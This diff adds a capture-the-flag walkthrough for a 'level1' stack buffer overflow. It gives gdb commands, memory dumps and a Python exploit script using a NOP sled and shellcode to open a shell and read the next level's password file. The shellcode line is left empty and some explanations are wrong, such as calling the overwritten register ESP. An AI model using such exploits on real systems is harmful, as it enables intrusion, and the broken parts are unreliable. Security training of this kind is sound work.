@@ -1,0 +1,99 @@
+*** LEVEL1 SOLUTION ***
+*** Please note all text inside back-ticks (``) are commands.
+*** Enter these command on the command line.
+
+# There is more than one way to exploit this program.
+  * Basic buffer overflow and then overwriting the EIP with the address of <run>
+  * NOP SLED with shell code injection
+  * This solution covers the more complicated NOP SLED
+  
+
+# Fist thing to see, the program waits for input and then exits
+  * Any normal input such as "A" or "42", the program just closes
+  * I ran inline python to check for buffer over flow
+  `./level1 <<< `python -c 'print "A"76'``
+  * We where shown a message that tells us we overwrote part of the EIP
+
+# Making my exploit script
+  * I made a file in /tmp/ called exploit.py
+  ________________________________________________________
+  #!/usr/bin/python
+  import struct
+  import os
+  	payload = "A" * 76
+	os.system("echo " + payload + " > payload.txt")
+	os.system("/home/user/level1/level1 < payload.txt")
+  _________________________________________________________
+  * This file will write 76 "A" into the file payload.txt.
+  * It will then pipe payload.txt into ./level1 program
+  * before e can run it we need to change permissions on our exploit.py
+  `chmod +x exploit.py`
+  `./exploit.py`
+
+# Now lets examine the program closer with <gdb> (we are still working in /tmp/)
+  `gdb /home/user/level1/level1`
+  * Set a breakpoint just before program closes and run program with payload
+  `b *0x08048495`
+  `run < payload.txt`
+
+# Break point hit & Overflow has happened so now I examined the memory
+  `x/32x $esp`
+  ________________________________________________________________________
+     0xbffff6b0:	0xbffff6c0	0x0000002f	0xbffff70c	0xb7fd0ff4
+  => 0xbffff6c0:	0x41414141	0x41414141	0x41414141	0x41414141
+     0xbffff6d0:	0x41414141	0x41414141	0x41414141	0x41414141
+     0xbffff6e0:	0x41414141	0x41414141	0x41414141	0x41414141
+     0xbffff6f0:	0x41414141	0x41414141	0x41414141	0x41414141
+     0xbffff700:	0x41414141	0x41414141	0x41414141 <=   0xb7e45400
+     0xbffff710:	0x00000001	0xbffff7a4	0xbffff7ac	0xb7fdc858
+     0xbffff720:	0x00000000	0xbffff71c	0xbffff7ac	0x00000000
+  ________________________________________________________________________
+  * Large block of memory is now filled with "A".
+
+# Check the stack frame to see $eip address
+  `info frame`
+  _________________________________________________________________________________
+     0xbffff6b0:	0xbffff6c0	0x0000002f	0xbffff70c	0xb7fd0ff4
+     0xbffff6c0:	0x41414141	0x41414141	0x41414141	0x41414141
+     0xbffff6d0:	0x41414141	0x41414141	0x41414141	0x41414141
+     0xbffff6e0:	0x41414141	0x41414141	0x41414141	0x41414141
+     0xbffff6f0:	0x41414141	0x41414141	0x41414141	0x41414141
+     0xbffff700:	0x41414141	0x41414141	0x41414141   => 0xb7e45400 <=
+     0xbffff710:	0x00000001	0xbffff7a4	0xbffff7ac	0xb7fdc858
+     0xbffff720:	0x00000000	0xbffff71c	0xbffff7ac	0x00000000
+  _________________________________________________________________________________
+  * The output will tell you $EIP address
+  * Now we know $EIP is at 0xb7e45400
+  * Now we create our NOP SLED and inject shell code.
+
+# Updated exploit.py
+  _________________________________________________________
+  #!/usr/bin/python
+  import struct
+  import os
+	payload = "A" * 76
+	nopAddress = struct.pack("I", 0xbffff710+100)
+	nopSled = "\x90" * 200
+	shellcode = 
+	payload = payload + nopAddress + nopSled + shellcode
+	os.system("echo " + payload + " > payload.txt")
+	os.system("/home/user/level1/level1 < payload.txt")
+  __________________________________________________________
+  * The new exploit.py will fill the buffer with "A"'s
+    Then in will Overwrite $ESP with the address somewhere in the middle of our Nap Sled
+    Then will file a large chuck of memory with 200 '\x90' characters (Not Sled)
+    At the end of the Nope Sled will be our  shell code which will be executed.
+  * This works because the $eip tank eour address which is somewhere in the top sled and then
+    Looks o execute the next instruction but find and 'nop', so it carries on searching all
+    The way down the top sled until it hit the shell code at the end and opens a shell.
+
+# Now when we run our exploit command nothing happens
+  * The shell opens but closes right after, we can use cat to keep it open.
+  `(cat payload.txt ; cat) | /home/user/level1/level1`
+
+# Shell is opened!
+  * All you do now is navigate to `cd /home/user/level2`
+  * Get the flag `cat .pass`
+
+
+
